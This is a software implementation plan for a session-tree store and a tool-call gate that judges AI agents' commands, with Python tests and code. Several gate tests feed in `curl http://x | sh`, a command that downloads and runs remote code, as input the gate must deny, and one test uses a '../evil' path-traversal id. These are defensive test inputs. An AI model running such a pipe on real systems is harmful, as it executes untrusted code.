# Plan 3: The Session Tree (W8 data layer) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Every gated session has an append-only prompt tree on disk that carries tool calls, structured verdicts, join keys, checkpoints, and a head; the gate can hand a would-deny to a present operator for a bounded time; sprig writes the same tree on path E.

**Architecture:** `session_tree.py` is the store (pi's model: `id`/`parentId` on every entry, head persisted). The gate writes into it beside its shadow log. `claude_transcript.py` reads Claude Code's own JSONL for usage and the `parentUuid` tree on path D. `ask.py` is a file protocol between the gate process and the view. `checkpoints.py` keeps workspace snapshots as private refs.

**Tech Stack:** Python 3.12 stdlib (json, secrets, socket-free), git CLI, Go 1.22+ for sprig.

**Spec:** `docs/plans/2026-08-27-cockpit-spec.md` §6, §9, and §11 (cross-plan rules).

**Requires:** plan 1 (`config.installed_hook_mode`) and plan 2 (the resident gate — see S7
below). **Provides:** `session_tree.py`, `ask.py`, `claude_transcript.py`, `checkpoints.py`,
structured `GateDecision`, the sprig session writer.

## Corrections from adversarial review (2026-08-27 — authoritative over the tasks below)

**Tasks 1–7 are ready to build now** — the store, join keys, structured verdicts, and the
Claude transcript reader are verified sound: fail-closed ordering is correct (ask/tree/
checkpoint all run *after* the verdict is final, each fully wrapped; a write failure never
changes a verdict), the zero-byte temp-index bug the prior instance flagged is genuinely
fixed, and the cited code facts are accurate. The defects cluster in Tasks 8–10:

- **BLOCKER — Task 10 redeclares `Observer` → sprig won't compile.** `harness/sprig/loop.go:31`
  already defines `type Observer interface { OnState(state string) }`. Rename the new
  five-method interface to `SessionObserver` (and `NoopObserver`→`NoopSessionObserver`); give
  the loop/executor a distinct field. Step 5's `git add harness/sprig/agent.go` is also wrong —
  `Agent` and the loop live in **`loop.go`**.
- **BLOCKER (data-loss) — Task 9 `restore()` deletes files the rollback never captured.**
  `snapshot()` `git rm --cached`s oversize/errored paths, so they are absent from the rollback
  tree; `restore()` then `unlink()`s every path in `present - wanted` with no recovery. An
  untracked >5 MB file, or a broken symlink (`p.stat()` follows links → `OSError` → skipped),
  is destroyed unrecoverably in the user's own repo. Fix: delete-set =
  `(present ∩ rollback.covers) - wanted`; use `p.lstat()`; refuse to restore when
  `rollback.skipped` is non-empty; pass `env=env` to the `ls-files` at ≈1744 (it currently
  reads the real index).
- **SHOULD-FIX (safety) — Task 8 ask channel is unauthenticated and never GC'd.**
  `wait_answer` honors any `answers/<id>.json` with `decision=="allow"` by existence alone,
  checked *before* the timeout, so a stale/pre-planted answer is accepted; the answer is never
  deleted and expired asks accumulate. `post_ask` writes a nonce; the answer must echo it;
  reject an answer whose mtime precedes its ask; delete the answer after consuming; sweep
  expired asks. (Mitigated today by off-by-default + enforce-only + hard-deny + 0700 + the
  write itself being gated, so not fail-*open* under a good envelope — but it must match its
  own safety story.) `wait_answer` keeps `timeout_s` (spec §9 corrected, §11.2).
- **SHOULD-FIX (cross-plan) — Task 8 ask blocks the shared resident gate.** `_maybe_ask`
  blocks up to 90 s inside `gate_and_contract`, which plan 2 turns into a single-connection
  socket server → one operator ask freezes every other session's gate. **The gate server must
  handle connections concurrently** (thread-per-connection). Add this requirement to plan 2's
  `gate serve` and test it here.
- **SHOULD-FIX — Task 10 sprig is under-specified.** No `tool_use_id` source (mint one per
  call in the loop and thread it), no usage plumbing (`Message` has no usage field;
  `parseAPIResponse` must populate one, or scope live usage out honestly). Without these,
  live `OnAssistant`/`OnVerdict` carry zeros and only the hand-built writer test passes.
- **SHOULD-FIX — Task 5/9 performance + atomicity.** `SessionTree.append` calls `head()`,
  which re-parses the *entire* file on every gate call (O(n²) on the blocking path). Task 9
  writes every repo path as one JSONL line — store `coversCount` + the ref instead (recover
  the list via `git ls-tree <ref>`); a multi-KB line also exceeds `PIPE_BUF` and breaks
  `O_APPEND` atomicity when Claude sub-agents share a `session_id` — state the single-writer
  assumption or lock. NIT: `_deny` should serialize `violations or []`, never `null`.

## Global Constraints

- `uv run pytest -q` green and `uv run ruff check .` clean before each commit (line length 100). `go test ./...` green in `harness/sprig` for Task 10.
- Commit messages: `type(scope): why`. No attribution trailers. Never push.
- Fail-closed: nothing in this plan may change a verdict on a write failure. Every store write on the gate path is best-effort and wrapped, and there is a test that injects a failure and asserts the verdict.
- The store path is `<data_dir>/sessions/`; the gate derives `data_dir = root.parent`.
- New symbols: `SessionTree`, `SessionIndex`, `SessionSummary`, `Entry` in `session_tree.py`. Do not add `Session`, `SessionRecord`, or `list_sessions`.
- Entry ids are 8 hex chars from `secrets.token_hex(4)`. Timestamps are `time.time()` floats.
- Files under `sessions/`, `asks/`, `answers/`, `proposals/` are mode 0600 in 0700 dirs (same as captures).

---

### Task 1: `SessionTree`: create, append, head, path

**Files:**
- Create: `src/opendaisugi/session_tree.py`
- Test: `tests/test_session_tree.py` (new)

**Interfaces:**
- Produces: `new_id()`, `Entry`, `SessionTree.create/open/open_or_create/meta/append/entries/head/set_head/path_to/children`, `ENTRY_TYPES`.

- [ ] **Step 1: Write the failing tests**

```python
# tests/test_session_tree.py
"""The session tree: append-only, id/parentId on every entry, head persisted."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from opendaisugi.session_tree import ENTRY_TYPES, Entry, SessionTree, new_id


def test_new_id_is_8_hex():
    assert len(new_id()) == 8 and int(new_id(), 16) >= 0


def test_create_writes_header_and_private_modes(tmp_path: Path):
    t = SessionTree.create(tmp_path / "sessions", session_id="s1", harness="claude-code", cwd="/w")
    assert t.path == tmp_path / "sessions" / "s1.jsonl"
    assert oct(t.path.stat().st_mode & 0o777) == "0o600"
    assert oct((tmp_path / "sessions").stat().st_mode & 0o777) == "0o700"
    meta = t.meta()
    assert meta["id"] == "s1" and meta["harness"] == "claude-code" and meta["cwd"] == "/w"
    assert meta["v"] == 1


def test_session_id_is_sanitized(tmp_path: Path):
    t = SessionTree.create(tmp_path / "s", session_id="../evil", harness="x", cwd="/")
    assert t.path.parent == tmp_path / "s"
    assert ".." not in t.path.name


def test_create_twice_raises(tmp_path: Path):
    SessionTree.create(tmp_path / "s", session_id="s1", harness="x", cwd="/")
    with pytest.raises(FileExistsError):
        SessionTree.create(tmp_path / "s", session_id="s1", harness="x", cwd="/")


def test_append_links_to_head_and_moves_it(tmp_path: Path):
    t = SessionTree.create(tmp_path / "s", session_id="s1", harness="x", cwd="/")
    assert t.head() is None
    p = t.append("prompt", {"text": "hi"})
    assert p.parent_id is None and t.head() == p.id
    a = t.append("assistant", {"text": "hello"})
    assert a.parent_id == p.id and t.head() == a.id
    rows = [json.loads(ln) for ln in t.path.read_text().splitlines()]
    assert rows[1]["type"] == "prompt" and rows[1]["parentId"] is None
    assert rows[2]["parentId"] == p.id and rows[2]["id"] == a.id


def test_label_does_not_move_head(tmp_path: Path):
    t = SessionTree.create(tmp_path / "s", session_id="s1", harness="x", cwd="/")
    p = t.append("prompt", {"text": "hi"})
    t.append("label", {"target": p.id, "label": "good"})
    assert t.head() == p.id


def test_set_head_persists_across_reopen(tmp_path: Path):
    t = SessionTree.create(tmp_path / "s", session_id="s1", harness="x", cwd="/")
    p1 = t.append("prompt", {"text": "one"})
    t.append("assistant", {"text": "a"})
    t.set_head(p1.id)
    again = SessionTree.open(tmp_path / "s", "s1")
    assert again.head() == p1.id
    p2 = again.append("prompt", {"text": "two"})
    assert p2.parent_id == p1.id  # a new branch from the moved head


def test_path_to_and_children(tmp_path: Path):
    t = SessionTree.create(tmp_path / "s", session_id="s1", harness="x", cwd="/")
    p = t.append("prompt", {"text": "one"})
    a = t.append("assistant", {"text": "a"})
    c = t.append("tool_call", {"name": "Bash"})
    assert [e.id for e in t.path_to(c.id)] == [p.id, a.id, c.id]
    assert [e.id for e in t.children(a.id)] == [c.id]
    assert [e.id for e in t.children(None)] == [p.id]
    with pytest.raises(KeyError):
        t.path_to("deadbeef")


def test_unknown_type_and_reserved_types_are_rejected(tmp_path: Path):
    t = SessionTree.create(tmp_path / "s", session_id="s1", harness="x", cwd="/")
    with pytest.raises(ValueError):
        t.append("banana", {})
    with pytest.raises(ValueError):
        t.append("session", {})
    with pytest.raises(ValueError):
        t.append("head", {})


def test_open_missing_raises_and_open_or_create_creates(tmp_path: Path):
    with pytest.raises(FileNotFoundError):
        SessionTree.open(tmp_path / "s", "nope")
    t = SessionTree.open_or_create(tmp_path / "s", session_id="s2", harness="x", cwd="/")
    assert t.meta()["id"] == "s2"
    assert (
        SessionTree.open_or_create(tmp_path / "s", session_id="s2", harness="y", cwd="/").meta()[
            "harness"
        ]
        == "x"
    )


def test_torn_last_line_is_ignored(tmp_path: Path):
    t = SessionTree.create(tmp_path / "s", session_id="s1", harness="x", cwd="/")
    p = t.append("prompt", {"text": "one"})
    with t.path.open("a") as f:
        f.write('{"type":"assistant","id":"abc')  # a writer mid-line
    assert [e.id for e in t.entries() if e.id][1:] == [p.id]
    assert t.head() == p.id


def test_entry_types_are_the_spec_set():
    assert ENTRY_TYPES == frozenset(
        {
            "session",
            "prompt",
            "assistant",
            "tool_call",
            "verdict",
            "tool_result",
            "checkpoint",
            "compaction",
            "branch_summary",
            "label",
            "note",
            "head",
        }
    )
    assert (
        Entry("prompt", "a1b2c3d4", None, 1.0, {"text": "x"})
        .to_json()
        .startswith('{"type": "prompt"')
    )
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/test_session_tree.py -q`
Expected: FAIL with `ModuleNotFoundError: opendaisugi.session_tree`.

- [ ] **Step 3: Write minimal implementation**

```python
# src/opendaisugi/session_tree.py
"""One append-only JSONL per session: the prompt tree daisugi can navigate.

pi's model, with the head persisted: every entry carries ``type``, ``id`` (8 hex
chars), ``parentId``, ``ts``. Line one is the session header. ``head`` lines
move the current leaf and carry no id. Nothing is ever deleted; a fork copies a
path into a new file that names its parent. Readers ignore a torn last line.
"""

from __future__ import annotations

import json
import os
import re
import secrets
import time
from collections.abc import Callable
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

SCHEMA_VERSION = 1
ENTRY_TYPES = frozenset(
    {
        "session",
        "prompt",
        "assistant",
        "tool_call",
        "verdict",
        "tool_result",
        "checkpoint",
        "compaction",
        "branch_summary",
        "label",
        "note",
        "head",
    }
)
_RESERVED = frozenset({"session", "head"})
_NO_MOVE = frozenset({"label", "head", "session"})
_META_KEYS = ("type", "id", "parentId", "ts")


def new_id() -> str:
    return secrets.token_hex(4)


def _safe_id(raw: object) -> str:
    safe = re.sub(r"[^A-Za-z0-9._-]", "_", str(raw or "")).strip(".")[:128]
    return safe or "no-session"


@dataclass(frozen=True)
class Entry:
    type: str
    id: str | None
    parent_id: str | None
    ts: float
    data: dict[str, Any] = field(default_factory=dict)

    def to_json(self) -> str:
        row: dict[str, Any] = {"type": self.type}
        if self.id is not None:
            row["id"] = self.id
        if self.type not in ("head", "session"):
            row["parentId"] = self.parent_id
        row["ts"] = self.ts
        row.update(self.data)
        return json.dumps(row, ensure_ascii=False)

    @classmethod
    def from_row(cls, row: dict[str, Any]) -> "Entry":
        data = {k: v for k, v in row.items() if k not in _META_KEYS}
        return cls(
            type=str(row["type"]),
            id=row.get("id"),
            parent_id=row.get("parentId"),
            ts=float(row.get("ts") or 0.0),
            data=data,
        )


class SessionTree:
    def __init__(self, path: Path) -> None:
        self.path = path

    @property
    def session_id(self) -> str:
        return self.path.stem

    # --- construction -------------------------------------------------------
    @classmethod
    def create(
        cls,
        sessions_dir: Path,
        *,
        session_id: str,
        harness: str,
        cwd: str,
        harness_session_id: str | None = None,
        transcript_path: str | None = None,
        parent_session: str | None = None,
        parent_entry: str | None = None,
        cache_key: str | None = None,
        clock: Callable[[], float] = time.time,
    ) -> "SessionTree":
        sessions_dir.mkdir(parents=True, exist_ok=True, mode=0o700)
        try:
            os.chmod(sessions_dir, 0o700)
        except OSError:
            pass
        sid = _safe_id(session_id)
        path = sessions_dir / f"{sid}.jsonl"
        if path.exists():
            raise FileExistsError(path)
        header = Entry(
            "session",
            sid,
            None,
            clock(),
            {
                "v": SCHEMA_VERSION,
                "harness": harness,
                "cwd": cwd,
                "harnessSessionId": harness_session_id,
                "transcriptPath": transcript_path,
                "parentSession": parent_session,
                "parentEntry": parent_entry,
                "cacheKey": cache_key,
            },
        )
        tree = cls(path)
        tree._write(header)
        try:
            os.chmod(path, 0o600)
        except OSError:
            pass
        return tree

    @classmethod
    def open(cls, sessions_dir: Path, session_id: str) -> "SessionTree":
        path = sessions_dir / f"{_safe_id(session_id)}.jsonl"
        if not path.exists():
            raise FileNotFoundError(path)
        return cls(path)

    @classmethod
    def open_or_create(cls, sessions_dir: Path, *, session_id: str, **header: Any) -> "SessionTree":
        try:
            return cls.open(sessions_dir, session_id)
        except FileNotFoundError:
            return cls.create(sessions_dir, session_id=session_id, **header)

    # --- io -----------------------------------------------------------------
    def _write(self, entry: Entry) -> None:
        with self.path.open("a", encoding="utf-8") as f:
            f.write(entry.to_json() + "\n")

    def entries(self) -> list[Entry]:
        out: list[Entry] = []
        try:
            text = self.path.read_text(encoding="utf-8")
        except FileNotFoundError:
            return out
        for line in text.splitlines():
            if not line.strip():
                continue
            try:
                row = json.loads(line)
            except json.JSONDecodeError:
                continue  # a torn line from a writer mid-append
            if isinstance(row, dict) and row.get("type") in ENTRY_TYPES:
                out.append(Entry.from_row(row))
        return out

    def meta(self) -> dict[str, Any]:
        for e in self.entries():
            if e.type == "session":
                return {"id": e.id, **e.data}
        return {}

    # --- tree ---------------------------------------------------------------
    def head(self) -> str | None:
        head: str | None = None
        for e in self.entries():
            if e.type == "head":
                head = e.data.get("leafId")
            elif e.type not in _NO_MOVE and e.id:
                head = e.id
        return head

    def append(
        self,
        type: str,
        data: dict[str, Any],
        *,
        parent_id: str | None = "head",
        clock: Callable[[], float] = time.time,
    ) -> Entry:
        if type not in ENTRY_TYPES or type in _RESERVED:
            raise ValueError(f"cannot append entry type {type!r}")
        parent = self.head() if parent_id == "head" else parent_id
        entry = Entry(type, new_id(), parent, clock(), dict(data))
        self._write(entry)
        return entry

    def set_head(self, entry_id: str, *, clock: Callable[[], float] = time.time) -> None:
        self.path_to(entry_id)  # KeyError if unknown
        self._write(Entry("head", None, None, clock(), {"leafId": entry_id}))

    def _by_id(self) -> dict[str, Entry]:
        return {e.id: e for e in self.entries() if e.id and e.type != "session"}

    def path_to(self, entry_id: str) -> list[Entry]:
        by_id = self._by_id()
        if entry_id not in by_id:
            raise KeyError(entry_id)
        out: list[Entry] = []
        cur: str | None = entry_id
        seen: set[str] = set()
        while cur is not None and cur not in seen:
            seen.add(cur)
            e = by_id.get(cur)
            if e is None:
                break
            out.append(e)
            cur = e.parent_id
        out.reverse()
        return out

    def children(self, entry_id: str | None) -> list[Entry]:
        return [
            e for e in self.entries() if e.id and e.type not in _NO_MOVE and e.parent_id == entry_id
        ]
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `uv run pytest tests/test_session_tree.py -q`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/opendaisugi/session_tree.py tests/test_session_tree.py
git commit -m "feat(sessions): an append-only session tree with ids, parents, and a persisted head"
```

---

### Task 2: Fork, and the index over all sessions

**Files:**
- Modify: `src/opendaisugi/session_tree.py` (add `fork`, `SessionSummary`, `SessionIndex`)
- Test: `tests/test_session_tree.py` (extend)

**Interfaces:**
- Produces: `SessionTree.fork(at_entry_id, *, new_session_id=None) -> SessionTree`; `SessionSummary`; `SessionIndex(sessions_dir).list() -> list[SessionSummary]`; `SessionIndex.mtime() -> float`.

- [ ] **Step 1: Write the failing tests**

```python
from opendaisugi.session_tree import SessionIndex, SessionSummary


def test_fork_copies_the_path_and_names_its_parent(tmp_path: Path):
    t = SessionTree.create(
        tmp_path / "s", session_id="s1", harness="sprig", cwd="/w", cache_key="k"
    )
    p = t.append("prompt", {"text": "one"})
    a = t.append("assistant", {"text": "a"})
    t.append("tool_call", {"name": "Bash"})  # not on the forked path
    child = t.fork(a.id)
    meta = child.meta()
    assert meta["parentSession"] == "s1" and meta["parentEntry"] == a.id
    assert meta["cacheKey"] == "k" and meta["harness"] == "sprig"
    assert [e.id for e in child.path_to(a.id)] == [p.id, a.id]
    assert child.head() == a.id
    assert len([e for e in child.entries() if e.id]) == 3  # header + 2
    assert child.session_id.startswith("s1-")
    # the parent is untouched
    assert len(t.entries()) == 4


def test_index_lists_sessions_newest_first(tmp_path: Path):
    d = tmp_path / "s"
    old = SessionTree.create(
        d, session_id="old", harness="claude-code", cwd="/a", clock=lambda: 10.0
    )
    old.append("prompt", {"text": "x"}, clock=lambda: 11.0)
    new = SessionTree.create(d, session_id="new", harness="sprig", cwd="/b", clock=lambda: 20.0)
    c = new.append("tool_call", {"name": "Bash", "detail": "ls"}, clock=lambda: 21.0)
    new.append(
        "verdict",
        {"toolUseId": "t1", "decision": "deny", "clause": "shell: no"},
        parent_id=c.id,
        clock=lambda: 22.0,
    )
    rows = SessionIndex(d).list()
    assert [r.session_id for r in rows] == ["new", "old"]
    assert isinstance(rows[0], SessionSummary)
    assert rows[0].last_ts == 22.0 and rows[0].entry_count == 3
    assert rows[0].last_tool_call["name"] == "Bash"
    assert rows[0].last_verdict["decision"] == "deny"
    assert rows[1].last_verdict is None
    assert SessionIndex(d).mtime() > 0


def test_index_on_missing_dir_is_empty(tmp_path: Path):
    assert SessionIndex(tmp_path / "none").list() == []
    assert SessionIndex(tmp_path / "none").mtime() == 0.0
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/test_session_tree.py -q`
Expected: FAIL with `ImportError: SessionIndex`.

- [ ] **Step 3: Write minimal implementation**

Add to `SessionTree`:

```python
def fork(
    self,
    at_entry_id: str,
    *,
    new_session_id: str | None = None,
    clock: Callable[[], float] = time.time,
) -> "SessionTree":
    """Copy the path root→``at_entry_id`` into a new session that names this one.

    Ids are kept, so the copied path is byte-for-byte the same tree; the
    child's head is ``at_entry_id``; ``cacheKey`` is inherited (forks share
    the cached prefix).
    """
    path = self.path_to(at_entry_id)
    meta = self.meta()
    child = SessionTree.create(
        self.path.parent,
        session_id=new_session_id or f"{self.session_id}-{new_id()}",
        harness=str(meta.get("harness", "")),
        cwd=str(meta.get("cwd", "")),
        harness_session_id=meta.get("harnessSessionId"),
        transcript_path=meta.get("transcriptPath"),
        parent_session=self.session_id,
        parent_entry=at_entry_id,
        cache_key=meta.get("cacheKey"),
        clock=clock,
    )
    for e in path:
        child._write(e)
    return child
```

Add at module level:

```python
@dataclass(frozen=True)
class SessionSummary:
    session_id: str
    harness: str
    cwd: str
    harness_session_id: str | None
    transcript_path: str | None
    parent_session: str | None
    last_ts: float
    entry_count: int
    last_tool_call: dict[str, Any] | None
    last_verdict: dict[str, Any] | None


class SessionIndex:
    """The roster: one summary per session file, newest first. Read-only."""

    def __init__(self, sessions_dir: Path) -> None:
        self.dir = sessions_dir

    def mtime(self) -> float:
        if not self.dir.exists():
            return 0.0
        return max((p.stat().st_mtime for p in self.dir.glob("*.jsonl")), default=0.0)

    def list(self) -> list[SessionSummary]:
        out: list[SessionSummary] = []
        if not self.dir.exists():
            return out
        for path in sorted(self.dir.glob("*.jsonl")):
            tree = SessionTree(path)
            entries = tree.entries()
            if not entries or entries[0].type != "session":
                continue
            meta = {"id": entries[0].id, **entries[0].data}
            last_call = next((e for e in reversed(entries) if e.type == "tool_call"), None)
            last_verdict = next((e for e in reversed(entries) if e.type == "verdict"), None)
            out.append(
                SessionSummary(
                    session_id=str(meta["id"]),
                    harness=str(meta.get("harness", "")),
                    cwd=str(meta.get("cwd", "")),
                    harness_session_id=meta.get("harnessSessionId"),
                    transcript_path=meta.get("transcriptPath"),
                    parent_session=meta.get("parentSession"),
                    last_ts=max(e.ts for e in entries),
                    entry_count=len(entries),
                    last_tool_call=(dict(last_call.data, id=last_call.id) if last_call else None),
                    last_verdict=(
                        dict(last_verdict.data, id=last_verdict.id) if last_verdict else None
                    ),
                )
            )
        out.sort(key=lambda s: s.last_ts, reverse=True)
        return out
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `uv run pytest tests/test_session_tree.py -q`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/opendaisugi/session_tree.py tests/test_session_tree.py
git commit -m "feat(sessions): fork copies a path into a child that names its parent; an index for the roster"
```

---

### Task 3: The hook keeps the join keys

**Files:**
- Modify: `src/opendaisugi/hook.py:143-185` (`_payload_to_record`), add `JOIN_KEYS`
- Modify: `src/opendaisugi/gate.py:410-446` (`_log_shadow` gains `join`), `:449-540` (`gate_and_contract` passes it)
- Test: `tests/test_hook.py` (extend), `tests/test_gate.py` (extend)

**Interfaces:**
- Produces: `hook.JOIN_KEYS = ("tool_use_id", "agent_id", "agent_type", "cwd", "transcript_path", "hook_event_name", "permission_mode")`; `hook.join_keys(payload) -> dict`; `_log_shadow(root, session_id, decision, payload_session_id=None, *, join=None)`.

- [ ] **Step 1: Write the failing tests**

Append to `tests/test_hook.py`:

```python
def test_record_keeps_the_join_keys(tmp_path: Path):
    payload = {
        "session_id": "sess1",
        "tool_name": "Bash",
        "tool_input": {"command": "ls"},
        "tool_use_id": "toolu_01",
        "agent_id": "ag1",
        "agent_type": "Explore",
        "cwd": "/w",
        "transcript_path": "/t/sess1.jsonl",
        "hook_event_name": "PreToolUse",
        "permission_mode": "default",
    }
    p = record_call(payload, root=tmp_path)
    rec = json.loads(p.read_text().splitlines()[0])
    for k in (
        "tool_use_id",
        "agent_id",
        "agent_type",
        "cwd",
        "transcript_path",
        "hook_event_name",
        "permission_mode",
    ):
        assert rec[k] == payload[k]


def test_missing_join_keys_are_absent_not_null(tmp_path: Path):
    p = record_call(
        {"session_id": "s", "tool_name": "Bash", "tool_input": {"command": "ls"}}, root=tmp_path
    )
    rec = json.loads(p.read_text().splitlines()[0])
    assert "tool_use_id" not in rec
```

Append to `tests/test_gate.py` (it has fixtures for a registered envelope; if not, use
`register_envelope(starter_envelope(tmp_path), session_id="s1", root=root)`):

```python
def test_shadow_log_carries_join_keys(tmp_path):
    from opendaisugi.gate import gate_and_contract, register_envelope, starter_envelope

    root = tmp_path / "gate"
    register_envelope(starter_envelope(tmp_path), session_id="s1", root=root)
    payload = {
        "session_id": "s1",
        "tool_name": "Read",
        "tool_input": {"file_path": "README.md"},
        "tool_use_id": "toolu_01",
        "agent_id": "ag1",
        "cwd": str(tmp_path),
        "transcript_path": str(tmp_path / "t.jsonl"),
    }
    gate_and_contract(json.dumps(payload).encode(), root=root, mode="enforce")
    rows = [json.loads(ln) for ln in (root / "shadow" / "s1.jsonl").read_text().splitlines()]
    assert rows[-1]["tool_use_id"] == "toolu_01"
    assert rows[-1]["agent_id"] == "ag1"
    assert rows[-1]["transcript_path"].endswith("t.jsonl")
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/test_hook.py tests/test_gate.py -q -k "join"`
Expected: FAIL (`KeyError: 'tool_use_id'`).

- [ ] **Step 3: Write minimal implementation**

In `hook.py` above `_payload_to_record`:

```python
JOIN_KEYS = (
    "tool_use_id",
    "agent_id",
    "agent_type",
    "cwd",
    "transcript_path",
    "hook_event_name",
    "permission_mode",
)


def join_keys(payload: dict[str, Any]) -> dict[str, Any]:
    """The payload fields that link a call to its session, transcript, and agent.

    ``tool_use_id`` joins a verdict to Claude's own transcript row;
    ``transcript_path`` is how a path-D session reaches usage counters and the
    ``parentUuid`` tree; ``agent_id`` names a sub-agent. Absent keys stay absent.
    """
    return {k: payload[k] for k in JOIN_KEYS if payload.get(k)}
```

At the end of `_payload_to_record`, before `return record`: `record.update(join_keys(payload))`.

In `gate.py`, `_log_shadow(..., payload_session_id=None, *, join: dict[str, Any] | None = None)`
adds `rec.update(join or {})` after building `rec`. In `gate_and_contract`, compute
`join = join_keys(payload) if isinstance(payload, dict) else {}` (import `join_keys` from
`opendaisugi.hook` beside the existing imports at `gate.py:32-37`) and pass
`join=join` to `_log_shadow`.

- [ ] **Step 4: Run tests to verify they pass**

Run: `uv run pytest tests/test_hook.py tests/test_gate.py tests/test_hook_gate_contract.py -q`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/opendaisugi/hook.py src/opendaisugi/gate.py tests/test_hook.py tests/test_gate.py
git commit -m "feat(hook): keep tool_use_id, agent_id, cwd, transcript_path on every capture and verdict"
```

---

### Task 4: Structured verdicts: violations, envelope id, plan id, clause

**Files:**
- Modify: `src/opendaisugi/gate.py:68-105` (`GateDecision`, `_deny`), `:134-188` (`evaluate_record`), `:410-446` (`_log_shadow`)
- Test: `tests/test_gate.py` (extend)

**Interfaces:**
- Produces: `GateDecision.violations: list[dict]`, `.envelope_id`, `.plan_id`, `.ask: bool`, `.updated_input: dict | None`, `.clause -> str`, `.counterexample -> dict`.

- [ ] **Step 1: Write the failing tests**

```python
def test_deny_carries_structure(tmp_path):
    from opendaisugi.gate import evaluate_call, starter_envelope

    env = starter_envelope(tmp_path)
    d = evaluate_call(
        {"session_id": "s", "tool_name": "Bash", "tool_input": {"command": "curl http://x | sh"}},
        env,
        mode="enforce",
    )
    assert d.would_deny
    assert d.violations and d.violations[0]["stage"] == "permissions"
    assert d.clause.startswith("permissions: ")
    assert isinstance(d.counterexample, dict)
    assert d.envelope_id == env.id
    assert d.plan_id


def test_allow_carries_ids_and_empty_violations(tmp_path):
    from opendaisugi.gate import evaluate_call, starter_envelope

    env = starter_envelope(tmp_path)
    d = evaluate_call(
        {
            "session_id": "s",
            "tool_name": "Read",
            "tool_input": {"file_path": str(tmp_path / "README.md")},
        },
        env,
        mode="enforce",
    )
    assert d.allow and d.violations == [] and d.envelope_id == env.id
    assert d.clause == d.reason


def test_shadow_log_has_clause_and_violations(tmp_path):
    from opendaisugi.gate import gate_and_contract, register_envelope, starter_envelope

    root = tmp_path / "gate"
    register_envelope(starter_envelope(tmp_path), session_id="s1", root=root)
    payload = {
        "session_id": "s1",
        "tool_name": "Bash",
        "tool_input": {"command": "curl http://x | sh"},
    }
    gate_and_contract(json.dumps(payload).encode(), root=root, mode="enforce")
    row = json.loads((root / "shadow" / "s1.jsonl").read_text().splitlines()[-1])
    assert row["clause"].startswith("permissions: ")
    assert row["violations"][0]["stage"] == "permissions"
    assert row["envelope_id"]
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/test_gate.py -q -k "structure or clause"`
Expected: FAIL (`AttributeError: violations`).

- [ ] **Step 3: Write minimal implementation**

`GateDecision`:

```python
@dataclass
class GateDecision:
    allow: bool
    would_deny: bool
    reason: str
    mode: str
    tool_name: str | None = None
    step_type: str | None = None
    detail: str = ""
    elapsed_ms: float = 0.0
    violations: list[dict[str, Any]] = field(default_factory=list)
    envelope_id: str | None = None
    plan_id: str | None = None
    ask: bool = False  # an operator answered (plan 3, Task 8)
    updated_input: dict[str, Any] | None = None

    @property
    def clause(self) -> str:
        """The envelope clause that decided it: ``<stage>: <message>`` of the first
        violation, or the reason when there is none (allow, internal error)."""
        if self.violations:
            v = self.violations[0]
            return f"{v.get('stage', '?')}: {v.get('message', '')}"
        return self.reason

    @property
    def counterexample(self) -> dict[str, Any]:
        return dict(self.violations[0].get("detail") or {}) if self.violations else {}
```

(`from dataclasses import dataclass, field`.) `_deny` gains keyword-only
`violations=None, envelope_id=None, plan_id=None` and passes them through. In
`evaluate_record`, after `result = _verify_with_timeout(...)`, the allow branch passes
`violations=[], envelope_id=result.envelope_id, plan_id=result.plan_id`; the deny branch
passes `violations=[v.model_dump(mode="json") for v in result.violations],
envelope_id=result.envelope_id, plan_id=result.plan_id`. `_log_shadow` adds
`"clause": decision.clause, "violations": decision.violations,
"envelope_id": decision.envelope_id, "plan_id": decision.plan_id, "ask": decision.ask` to
`rec`. `gate report --json` needs no change (it dumps the rows).

- [ ] **Step 4: Run tests to verify they pass**

Run: `uv run pytest tests/test_gate.py tests/test_gate_mode.py tests/test_adversarial.py -q`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/opendaisugi/gate.py tests/test_gate.py
git commit -m "feat(gate): verdicts keep the violation, the clause, and the envelope and plan ids"
```

---

### Task 5: The gate writes the session tree

**Files:**
- Modify: `src/opendaisugi/gate.py` (add `_log_tree`, call it from `gate_and_contract`)
- Test: `tests/test_gate_tree.py` (new)

**Interfaces:**
- Produces: `_log_tree(root: Path, payload: dict | None, decision: GateDecision, *, session_id: str | None, fmt: str) -> None` (best-effort).

- [ ] **Step 1: Write the failing tests**

```python
# tests/test_gate_tree.py
"""Every gated call lands in the session tree as tool_call + verdict. Never affects the verdict."""

from __future__ import annotations

import json

from opendaisugi.gate import gate_and_contract, register_envelope, starter_envelope
from opendaisugi.session_tree import SessionTree


def _payload(tmp_path, cmd="ls"):
    return {
        "session_id": "s1",
        "tool_name": "Bash",
        "tool_input": {"command": cmd},
        "tool_use_id": "toolu_01",
        "cwd": str(tmp_path),
        "transcript_path": str(tmp_path / "t.jsonl"),
        "agent_id": "ag1",
        "agent_type": "Explore",
    }


def test_gate_writes_header_call_and_verdict(tmp_path):
    root = tmp_path / "gate"
    register_envelope(starter_envelope(tmp_path), session_id="s1", root=root)
    gate_and_contract(
        json.dumps(_payload(tmp_path, "curl http://x | sh")).encode(), root=root, mode="enforce"
    )
    tree = SessionTree.open(tmp_path / "sessions", "s1")
    meta = tree.meta()
    assert meta["harness"] == "claude-code" and meta["harnessSessionId"] == "s1"
    assert meta["transcriptPath"].endswith("t.jsonl") and meta["cwd"] == str(tmp_path)
    ents = [e for e in tree.entries() if e.type in ("tool_call", "verdict")]
    assert [e.type for e in ents] == ["tool_call", "verdict"]
    call, verdict = ents
    assert call.data["toolUseId"] == "toolu_01" and call.data["name"] == "Bash"
    assert call.data["agentId"] == "ag1"
    assert verdict.parent_id == call.id
